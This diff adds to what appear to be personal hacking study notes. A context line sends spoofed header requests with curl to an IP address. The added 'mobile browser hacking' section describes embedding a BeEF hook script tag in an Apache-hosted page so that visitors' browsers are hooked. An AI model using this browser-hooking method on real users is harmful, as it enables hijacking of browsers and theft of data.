@@ -759,3 +759,16 @@ to sent a post referer
 user agent and referer combined 
 curl -H "User-Agent: Sup3rS3cr3tAg3nt" -H "Referer:awesomesauce.com" http://165.227.106.113/header.php
 
+
+mobile browser hacking
+
+install beef
+run beef by     sudo ./beef   int directore
+copy the infected url and past it in the hosted web page html file     <script src="url"></script>
+when the page is loaded the web browser current page will be hooked
+ to host in kali
+ sudo service apache2 start
+ sudo service apache2 status
+ sudo service apache2 stop
+
+file location var / www/index.html
